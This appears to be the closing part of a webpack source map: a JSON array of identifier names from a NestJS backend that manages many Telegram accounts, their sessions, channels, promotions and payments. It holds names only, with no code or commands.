"toJSON","virtuals","doc","ret","_id","ConfigurationSchema","SchemaFactory","createForClass","add","Types","Mixed","ConfigurationController","configurationService","findOne","update","updateClientDto","Patch","ApiBody","ApiTags","ConfigurationService","connection","onModuleInit","clientId","onModuleDestroy","notifbot","encodeURIComponent","closeConnection","close","Global","ConfigModule","forRoot","MongooseModule","forRootAsync","useFactory","uri","mongouri","forFeature","collection","schema","Inject","getConnectionToken","Connection","configurationModel","setEnv","then","BotConfig","ready","OnModuleInit","exec","NotFoundException","updatedUser","findOneAndUpdate","$set","new","upsert","InjectModel","Model","TelegramController","telegramService","mobile","connectionManager","getClient","disconnect","unregisterClient","disconnectAllClients","disconnectAll","getMe","getEntity","entity","updateProfile","updateProfileDto","updateNameandBio","firstName","about","setProfilePhoto","photoDto","setProfilePic","deleteProfilePhotos","getMessages","chatId","limit","sendMessage","dto","forwardMessage","forwardDto","forwardBulkMessages","fromChatId","toChatId","messageIds","processBatchMessages","batchOp","processBatch","items","batchSize","batch","operation","BatchOperationType","FORWARD","item","messageId","DELETE","deleteChat","peer","justClear","BadRequestException","delayMs","searchMessages","queryParams","getChannelInfo","includeIds","forwardMedia","channel","autoDisconnect","handler","leaveChannel","updateUsername","updateUsernameDto","newUsername","setup2FA","set2Fa","updatePrivacy","updatePrivacyBatch","settings","getActiveSessions","getAuths","terminateOtherSessions","removeOtherAuths","createNewSession","getSessionInfo","terminateSession","getConnectionStatus","getCallLogStats","getCallLog","addContactsBulk","contactsDto","addContacts","phoneNumbers","getContacts","sendMedia","sendMediaDto","client","MediaType","PHOTO","sendPhotoChat","caption","filename","sendFileChat","downloadMedia","downloadMediaFile","sendMediaAlbum","albumDto","getMediaMetadata","types","startDate","endDate","minId","maxId","undefined","getFilteredMedia","getGroupMembers","groupId","getGrpMembers","blockChat","blockUser","deleteChatHistory","deleteHistoryDto","sendMessageWithInlineButton","sendInlineMessage","getAllDialogs","offsetId","archived","getDialogs","getLastActiveTime","createGroupWithOptions","options","updateGroupSettings","addGroupMembers","memberOp","members","removeGroupMembers","handleAdminOperation","adminOp","isPromote","promoteToAdmin","userId","permissions","rank","demoteAdmin","cleanupChat","cleanup","beforeDate","onlyMedia","excludePinned","getChatStatistics","period","scheduleMessage","schedule","scheduledTime","replyTo","silent","getScheduledMessages","sendVoiceMessage","voice","sendViewOnceMedia","file","viewOnceDto","sourceType","MediaSourceType","BINARY","binaryData","originalname","base64Data","getChatHistory","offset","getMessagesNew","unblockGroupUser","getGroupAdmins","getGroupBannedUsers","exportContacts","exportDto","format","includeBlocked","toISOString","importContacts","contacts","manageBlockList","blockList","userIds","block","getContactStatistics","createChatFolder","getChatFolders","editMessage","updateChatSettings","sendMediaBatch","hasPassword","getChats","offsetDate","offsetPeer","folderId","getFileUrl","getMessageStats","getTopPrivateChats","addBotsToChannel","body","channelIds","createBot","createBotDto","ApiParam","description","required","ApiResponse","Param","UpdateProfileDto","ProfilePhotoDto","Delete","ApiQuery","Number","Query","example","SendMessageDto","ForwardBatchDto","BatchProcessDto","ApiOkResponse","SearchMessagesResponseDto","ApiBadRequestResponse","ApiNotFoundResponse","ApiUnauthorizedResponse","SearchMessagesDto","Boolean","UpdateUsernameDto","PrivacySettingsDto","ConnectionStatusDto","AddContactsDto","SendMediaDto","SendMediaAlbumDto","enum","MediaMetadataDto","DeleteHistoryDto","default","createGroupDto","GroupSettingsDto","GroupMemberOperationDto","AdminOperationDto","ChatCleanupDto","ScheduleMessageDto","ApiConsumes","properties","UseInterceptors","FileInterceptor","storage","multer","memoryStorage","UploadedFile","ViewOnceMediaDto","ContactExportImportDto","ContactBlockListDto","CreateChatFolderDto","Put","CreateBotDto","botToken","username","TelegramService","forwardRef","TelegramValidationConfig","provide","useValue","TelegramLogger","usersService","activeChannelsService","channelsService","cleanupInterval","startCleanupInterval","setUsersService","logOperation","clearInterval","getActiveClientSetup","setActiveClientSetup","getChatId","telegramClient","getchatId","tryJoiningChannel","chatEntity","joinChannel","phoneNumber","canSendMsgs","remove","channelId","removeChannels","channelDetails","searchError","private","addContact","getSelfMsgsInfo","getSelfMSgsInfo","createGroup","setTimeout","forwardMediaToBot","channels","filter","chat","isChannel","isGroup","cannotSendMsgs","defaultBannedRights","sendMessages","broadcast","participantsCount","shouldMatch","id","title","megagroup","restricted","forbidden","createMultiple","getmedia","getMediaMessages","sendIds","channelInfo","set2fa","errorDetails","HttpException","updatePrivacyforDeletedAccount","updateProfilePic","downloadProfilePic","index","getAllMediaMetaData","leaveChannels","leaveChannelIds","canSendFalseChats","query","dialogs","chatData","activeConnections","getActiveConnectionCount","rateLimited","totalOperations","forwardMessages","auths","count","processor","errors","processed","i","slice","logError","createGroupOrChannel","chats","scheduleMessageSend","album","setContentFilters","filters","contactCount","mediaCount","media","base64String","isVideo","ext","pop","size","mediaData","localPath","extname","fileBuffer","readFileSync","basename","accountsChannel","updatesChannel","notifChannel","httpFailuresChannel","botTokens","BOT_TOKENS","token","botInfo","getBotInfo","setupBotInChannel","changeInfo","postMessages","editMessages","deleteMessages","banUsers","inviteUsers","pinMessages","addAdmins","anonymous","manageCall","ok","botId","botUsername","UsersService","ActiveChannelsService","ChannelsService","TelegramManager","sessionString","session","StringSession","channelArray","contentFilters","activeClientSetup","groupName","groupDescription","invoke","Api","CreateChannel","forImport","accessHash","archiveChat","usersToAdd","addUsersResult","InviteToChannel","InputChannel","users","folders","EditPeerFolders","folderPeers","InputFolderPeer","InputPeerChannel","createOrJoinChannel","channelAccessHash","accesshash","forwardSecretMsgs","me","finalChats","Set","mediaMessages","MessageMediaType","VIDEO","ROUND_VIDEO","DOCUMENT","VOICE","ROUND_VOICE","photo","messages","video","e","bots","getAllBotUsernames","ChannelCategory","SAVED_MESSAGES","getBotUsername","bot","getInputEntity","sendContactsFile","USER_WARNINGS","warn","uniqueMessageIds","document","roundVideo","roundVoice","chunkSize","fromPeer","revoke","totalMessages","forwardedCount","total","cleanupClient","handlers","listEventHandlers","removeEventHandler","debug","connected","destroy","delete","errorHandler","createClient","handlerFn","TelegramClient","parseInt","API_ID","API_HASH","connectionRetries","setLogLevel","LogLevel","ERROR","phone","addEventHandler","event","NewMessage","handleEvents","Chat","Channel","participants","GetParticipants","ChannelParticipantsRecent","hash","ChannelParticipants","userInfo","ChannelParticipant","userDetails","tgId","lastName","entityLike","getLastMsgs","msgs","resp","text","selfChatId","photoCount","ownPhotoCount","ownVideoCount","otherPhotoCount","otherVideoCount","videoCount","movieCount","messageHistory","toLocaleLowerCase","contains","fwdFrom","canSendTrueCount","canSendFalseCount","totalCount","replace","chatsArrayLength","ids","namePrefix","AddContact","mobiles","inputContacts","InputPhoneContact","ImportContacts","startsWith","LeaveChannel","JoinChannel","account","GetAuthorizations","auth","authorizations","isAuthMine","appName","country","deviceModel","resetAuthorization","field","values","some","criterion","ResetAuthorization","getAllChats","className","thumbnailUrl","getMediaUrl","date","sender","senderId","is_self","out","fromId","MessageMediaPhoto","sizes","thumb","MessageMediaDocument","mimeType","thumbs","button","buttons","KeyboardButtonUrl","Search","InputPeerEmpty","q","InputMessagesFilterPhotos","minDate","maxDate","addOffset","callLogs","InputMessagesFilterPhoneCalls","action","MessageActionPhoneCall","filteredResults","outgoing","incoming","chatCallCounts","totalCalls","logAction","peerId","ent","filteredChatCallCounts","getCallLogsInternal","finalResult","isPrivate","SetPrivacy","InputPrivacyKeyPhoneCall","rules","InputPrivacyValueDisallowAll","InputPrivacyKeyProfilePhoto","InputPrivacyValueAllowAll","InputPrivacyKeyPhoneNumber","InputPrivacyKeyStatusTimestamp","InputPrivacyKeyAbout","UpdateProfile","photoIndex","photos","GetUserPhotos","selectedPhoto","Math","max","photoFileSize","photoBuffer","downloadFile","InputPhotoFileLocation","fileReference","thumbSize","dcId","outputPath","latest","dateActive","GetContacts","DeleteHistory","Block","floor","getTime","safeGetEntity","mediaType","getMediaType","flat","hasMore","lastOffsetId","MessageMediaEmpty","fileLocation","inputLocation","InputDocumentFileLocation","iterDownload","requestSize","write","downloadWithTimeout","promise","race","_","getMediaDetails","DocumentEmpty","videoAttr","attributes","find","attr","DocumentAttributeVideo","fileNameAttr","DocumentAttributeFilename","fileName","duration","width","w","height","h","downloadFileFromUrl","baseUsername","newUserName","increment","UpdateUsername","CheckUsername","InputPrivacyKeyForwards","actualFilename","inputFile","uploadFile","CustomFile","workers","SendMedia","InputMediaUploadedDocument","supportsStreaming","ttlSeconds","InputMediaUploadedPhoto","randomId","random","filePath","writer","createWriteStream","pipe","image","statSync","UploadProfilePhoto","GetPassword","imapService","twoFaDetails","email","hint","newPassword","checkMailInterval","setInterval","updateTwoFaSettings","isCheckPassword","emailCodeCallback","retry","codeInterval","onEmailCodeError","sendFile","DeletePhotos","newClient","start","phoneCode","waitForOtp","onError","save","trim","channelUpdate","updates","u","UpdateChannel","member","EditPhoto","InputChatUploadedPhoto","EditTitle","EditChatAbout","slowMode","ToggleSlowMode","seconds","opts","scheduleDate","uploadedFile","forceDocument","GetScheduledHistory","Message","mediaFiles","InputSingleMedia","entities","SendMultiMedia","multiMedia","parseMode","DocumentAttributeAudio","toDelete","pinned","m","deletedCount","privacyRules","everybody","InputPrivacyValueAllowContacts","nobody","privacyMap","lastSeen","profilePhotos","forwards","calls","groups","InputPrivacyKeyChatInvite","authorizationsResult","devicesResult","GetWebAuthorizations","sessions","platform","systemVersion","dateCreated","ip","region","webSessions","domain","browser","exceptCurrent","ResetAuthorizations","ResetWebAuthorizations","ResetWebAuthorization","periodInSeconds","day","week","month","uniqueSenders","messageTypes","other","topSenders","sort","a","b","mostActiveHours","hour","getHours","getMediaExtension","mime","filterHandler","NewMessageEvent","evaluateMessage","actions","executeFilterAction","keywords","messageText","keyword","mediaTypes","EditBanned","participant","bannedRights","ChatBannedRights","untilDate","getSearchFilter","InputMessagesFilterVideo","InputMessagesFilterDocument","InputMessagesFilterUrl","InputMessagesFilterRoundVideo","InputMessagesFilterPhotoVideo","InputMessagesFilterVoice","InputMessagesFilterRoundVoice","InputMessagesFilterGif","InputMessagesFilterMusic","InputMessagesFilterChatPhotos","InputMessagesFilterGeo","InputMessagesFilterContacts","missed","InputMessagesFilterEmpty","getEntityId","User","viewMessages","sendStickers","sendGifs","sendGames","sendInline","embedLinks","EditAdmin","adminRights","ChatAdminRights","ChannelParticipantsAdmins","ChannelParticipantsBanned","queryFilter","searchQuery","TEXT","filteredMessages","unwantedTexts","fileNameText","localResult","allMedia","concat","thumbBuffer","mediaDetails","entityId","dialog","dialogError","generateCSV","contact","blocked","generateVCard","contactsResult","blockedContacts","GetBlocked","csvData","peers","p","success","Unblock","onlineContacts","c","online","withPhone","mutual","lastWeekActive","wasOnline","weekAgo","setDate","getDate","DialogFilter","includePeers","includedChats","excludePeers","excludedChats","pinnedPeers","includeContacts","nonContacts","includeNonContacts","includeGroups","broadcasts","includeBroadcasts","includeBots","excludeMuted","excludeRead","excludeArchived","UpdateDialogFilter","GetDialogFilters","includedChatsCount","excludedChatsCount","inputMedia","getMimeType","getMediaAttributes","EditMessage","unreadCount","lastMessage","linkedChat","linkedChannel","SetDiscussionGroup","group","fromDate","setMonth","getMonth","stats","withMedia","withLinks","withForwards","byHour","fill","byType","match","privateChats","isUser","fake","chatStats","ceil","batchResults","processingStart","messageStats","CHAT_PHOTO","callStats","mediaStats","videos","userCalls","interactionScore","activityBreakdown","videoCalls","mediaSharing","textMessages","processingTime","round","topChats","totalTime","test","chars","uniqueSuffix","charAt","tokenMatch","aboutText","profilePhotoUrl","photoError","createVCardContent","vCardContent","tempPath","mkdirSync","recursive","fileContent","PHONE_PATTERN","USERNAME_PATTERN","MESSAGE_MAX_LENGTH","CAPTION_MAX_LENGTH","FILE_SIZE_LIMIT","BATCH_SIZE_LIMIT","ALLOWED_MEDIA_TYPES","ALLOWED_PRIVACY_LEVELS","MESSAGE_TYPES","DEFAULT_PAGINATION","maxLimit","BaseBatchItemDto","ApiProperty","IsString","BatchItemDto","IsOptional","IsNumber","IsEnum","IsArray","ArrayMinSize","ArrayMaxSize","each","Transform","ChatStatisticsDto","ContactGroupDto","String","IsBoolean","ContactImportDto","IsNotEmpty","MaxLength","ApiPropertyOptional","IsInt","AdminPermission","AdminPermissionsDto","BaseGroupOperationDto","ValidateNested","Type","IsObject","IsDateString","BaseMediaOperationDto","MediaSearchDto","MediaFilterDto","IsUrl","MediaAlbumItemDto","VoiceMessageDto","SearchScope","ALL","Min","minimum","maximum","Max","IsDate","MessageTypeResult","MetadataType","DialogsQueryDto","BulkMessageOperationDto","minLength","maxLength","minItems","maxItems","PrivacyLevelEnum","SecuritySettingsDto","GetScheduledMessagesDto","DeleteScheduledMessageDto","RescheduleMessageDto","BatchProcessItemDto","ValidateIf","o","PATH","BASE64","ConnectionManager","clients","cleanupInactiveConnections","maxIdleTime","lastUsed","updateLastUsed","logDebug","clientInfo","telegramManager","registerClient","ACCOUNT_LOGIN_FAILURES","updateByFilter","$or","expired","hasClient","number","has","clientMobiles","keys","clear","intervalMs","catch","stopCleanupInterval","logWarning","TgSignupController","TgSignupService","cleanupStaleSessions","SESSION_CLEANUP_INTERVAL","phones","activeClients","disconnectClient","getRandomCredentials","API_CREDENTIALS","createdAt","LOGIN_TIMEOUT","validatePhoneNumber","clearTimeout","timeoutId","sendCode","existingSession","apiId","apiHash","retryDelay","useWSS","sendResult","SendCode","CodeSettings","currentNumber","allowAppHash","SentCodeSuccess","phoneCodeHash","isCodeViaApp","SentCodeTypeApp","verifyCode","newSession","reconnectError","signInResult","SignIn","AuthorizationSignUpRequired","handleNewUserRegistration","userData","processLoginResult","handle2FALogin","requires2FA","passwordSrpResult","passwordCheck","computeCheck","CheckPassword","randomName","signUpResult","SignUp","twoFA","lastActive","personalChats","totalChats","recentUsers","gender","create","InternalServerErrorException","PHONE_PREFIX","SendCodeDto","Matches","VerifyCodeDto","TgSignupResponse","tgSignupService","sendCodeDto","HttpStatus","CREATED","verifyCodeDto","BAD_REQUEST","OK","statusCode","TOO_MANY_REQUESTS","INTERNAL_SERVER_ERROR","ApiExtraModels","ActiveChannelsController","createActiveChannelDto","createChannelDtos","findAll","updateActiveChannelDto","addReaction","addReactionDto","reactions","addReactions","getRandomReaction","removeReaction","CreateActiveChannelDto","UpdateActiveChannelDto","AddReactionDto","ActiveChannel","ActiveChannelSchema","activeChannelModel","promoteMsgsService","availableMsgs","bulkOps","updateOne","bulkWrite","ordered","removeFromAvailableMsgs","$pull","addToAvailableMsgs","$addToSet","findOneAndDelete","randomIndex","reaction","getActiveChannels","skip","notIds","$gt","$ne","aggregate","$match","$skip","$limit","$sort","$project","randomField","executeQuery","queryExec","resetWordRestrictions","updateMany","banned","resetAvailableMsgs","$expr","$lt","$size","$ifNull","updateBannedChannels","updateDefaultReactions","PromoteMsgsService","reactRestricted","wordRestriction","dMRestriction","PartialType","Prop","unique","mongoose","defaultMessages","defaultReactions","ArchivedClientController","archivedclientService","createClientDto","checkArchivedClients","fetchOne","CreateClientDto","SearchClientDto","UpdateClientDto","ArchivedClientService","ClientSchema","archivedclientModel","clientService","promoteRepl","product","gpayId","promoteMobile","qrId","_doc","deletedUser","$regex","RegExp","archivedClients","clientIds","ClientService","BufferClientController","joinChannelsforBufferClients","joinchannelForBufferClients","checkbufferClients","checkBufferClients","addNewUserstoBufferClients","badIds","goodIds","setAsBufferClient","createdOrupdate","createOrUpdate","CreateBufferClientDto","SearchBufferClientDto","UpdateBufferClientDto","BufferClientService","BufferClientSchema","bufferClientModel","promoteClientService","joinChannelMap","leaveChannelMap","isJoinChannelProcessing","isLeaveChannelProcessing","JOIN_CHANNEL_INTERVAL","LEAVE_CHANNEL_INTERVAL","LEAVE_CHANNEL_BATCH_SIZE","bufferClient","throwErr","returnDocument","createOrUpdateUserDto","existingUser","deleteOne","removeFromBufferMap","clearBufferMap","clearJoinChannelInterval","skipExisting","clearLeaveChannelInterval","existingkeys","$nin","joinChannelQueue","leaveChannelQueue","joinChannelIntervalId","processTimeout","shift","channelsInfo","removeFromLeaveMap","clearLeaveMap","leaveChannelIntervalId","channelsToProcess","splice","availableDate","ConflictException","flatMap","bufferclients","promoteclients","promoteclientIds","cli","sixMonthsAgo","documents","PromoteClientService","BufferClient","BuildController","buildService","BuildService","BuildSchema","buildModel","npointSerive","updateDocument","NpointService","Build","ChannelsController","createChannelDto","updateChannelDto","CreateChannelDto","SearchChannelDto","UpdateChannelDto","ChannelSchema","ChannelModel","getChannels","pattern","notPattern","$and","$not","$addFields","$rand","ClientController","updateClient","findAllMasked","NOT_FOUND","requestBody","addPromoteMobile","mobileNumber","removePromoteMobile","Client","settingupClient","clientModel","bufferClientService","archivedClientService","clientsMap","lastUpdateMap","refreshMap","checkNpoint","existingClient","areJsonsNotSame","clientData","mapToJson","maskedCls","maskedClient","updatedAt","lean","allClients","every","uptimeChecker","uptimebot","setupClient","setupClientQueryDto","toBoolean","AUTO_CLIENT_SETUP","existingClientMobile","$lte","newBufferClient","existingMobile","newMobile","updateClientSession","updatedUsername","setup","days","archiveOld","formalities","middleName","toUpperCase","existingClientUser","deployKey","bufferClientDto","updatedBufferClient","lastUpdate","dbcoll","updateClients","generateNewSession","attempt","v","ArrayNotEmpty","NpointController","npointService","fetchDocument","postDocument","fetchAllDocuments","updatedDocument","content","csrfToken","cookie","baseUrl","signInUrl","fetchCsrfToken","request","fetchCsrfTokenFromHtml","ensureCsrfToken","documentId","post","put","csrfTokenMatch","CreatePromoteClientDto","SearchPromoteClientDto","UpdatePromoteClientDto","PromoteClientController","joinChannelsforPromoteClients","joinchannelForPromoteClients","checkpromoteClients","checkPromoteClients","addNewUserstoPromoteClients","setAsPromoteClient","PromoteClientSchema","promoteClientModel","promoteClient","removeFromPromoteMap","clearPromoteMap","clientPromoteMobiles","bufferClients","bufferClientIds","PromoteClient","PromoteMsgsController","PromoteMsgSchema","PromoteMsg","promotemsgModel","CreatePromoteStatDto","UpdatePromoteStatDto","PromoteStatController","promoteStatService","createPromoteStatDto","findByClient","updatePromoteStatDto","deleteAll","PromoteStatService","PromoteStat","PromoteStatSchema","promoteStatModel","promoteStat","deleteMany","reinitPromoteStats","uniqueChannels","releaseDay","lastUpdatedTimeStamp","of","ResponseType","additionalProperties","CreateStatDto","StatController","statService","createStatDto","findByChatIdAndProfile","profile","updateStatDto","UpdateStatDto","StatService","StatSchema","Stat","statModel","stat","Stat2Controller","Stat2Service","Stat2","TimestampController","timestampService","getClientsWithTimeDifference","thresholdMinutes","threshold","updateTimestampDto","TimestampService","TimestampSchema","timestampModel","timestamp","getTimeDifferences","currentTime","differences","difference","urls","clientParams","repl","updatedTimestamp","Timestamp","TransactionStatus","CreateTransactionDto","PENDING","MinLength","parseFloat","UpdateTransactionDto","Transaction","min","TransactionSchema","amount","TransactionController","transactionService","createTransactionDto","transactionId","issue","refundMethod","updateTransactionDto","TransactionService","transactionModel","newTransaction","savedTransaction","transaction","findById","transactions","transactionIdQuery","isValidObjectId","countDocuments","sendNotification","remainingFilters","updatedTransaction","findByIdAndUpdate","runValidators","deletedTransaction","findByIdAndDelete","UpiIdController","UpiIdService","updateUpiIdsdto","UpiIdSchema","UpiId","UpiIdModel","upiIds","refreshUPIs","existingUpiIds","CreateUserDataDto","SearchDto","UpdateUserDataDto","UserData","UserDataSchema","UserDataController","userDataService","createUserDataDto","updateAll","updateUserDataDto","clearCount","UserDataService","userDataModel","callCounts","currentCount","resetPaidUsers","payAmount","limitTime","paidReply","CreateUserDto","SearchUserDto","UpdateUserDto","UserSchema","UsersController","createUserDto","updateUserDto","userModel","clientsService","newUserBackup","matchedCount","modifiedCount","app","NestFactory","DocumentBuilder","setTitle","setDescription","setVersion","build","use","req","next","header","enableCors","allowedHeaders","origin","SwaggerModule","createDocument","useGlobalPipes","transformOptions","enableImplicitConversion","reason","isShuttingDown","shutdown","signal","exit","init","listen","PORT","getUrl","bootstrap","originalUrl","endpoint","verbose","ms","str","arr","element","normalizedValue","inputString","matches","freeze","json1","json2","keysToIgnore","normalizeObject","obj","normalized","sortedKeys","normalized1","normalized2","regex","titleMatch","usernameMatch","categoryMap","initialized","initPromise","initialize","envKeys","botTokensStr","t","category","getCategoryFromDescription","botUsernames","fetchUsername","lastUsedIndex","desc","cat","assertInitialized","getChannelId","getBotAndChannel","DEFAULT_RETRY_CONFIG","maxRetries","baseDelay","maxDelay","jitterFactor","DEFAULT_NOTIFICATION_CONFIG","enabled","channelEnvVar","notifyInternal","formattedMessage","extractMessage","notificationText","channelUrl","ppplbot","notifUrl","RETRYABLE_NETWORK_ERRORS","RETRYABLE_STATUS_CODES","shouldRetry","parsedError","isAxiosError","calculateBackoff","base","pow","jitter","makeBypassRequest","bypassUrl","bypassURL","finalBypassUrl","bypassAxios","retryConfig","notificationConfig","urlInfo","parsedUrl","URL","pathname","parseUrl","lastError","controller","AbortController","currentTimeout","abort","abortError","parseErrorError","isTimeout","bypassResponse","bypassError","bypassParsedError","extractBypassError","delay","errorData","parsedLastError","extractLastError","finalError","currentTokenIndex","initializeBotTokens","getBotTokens","tokens","apiUrl","DEFAULT_ERROR_CONFIG","maxMessageLength","notificationTimeout","ignorePatterns","defaultStatus","defaultMessage","defaultError","safeStringify","depth","maxDepth","k","errorInfo","extracted","sendErr","fullConfig","prefixStr","ResponseCode","extractStatusCode","rawMessage","responseData","ErrorMessage","UserMessage","extractErrorMessage","extractErrorType","extractedMessage","fullMessage","raw","ignoreError","patterns","shouldIgnoreError","notificationMessage","notificationError","fatalError","createError","errorType","ErrorUtils","module","require","__webpack_module_cache__","__webpack_exports__","__webpack_require__","moduleId","cachedModule","__webpack_modules__","call"],"sourceRoot":""}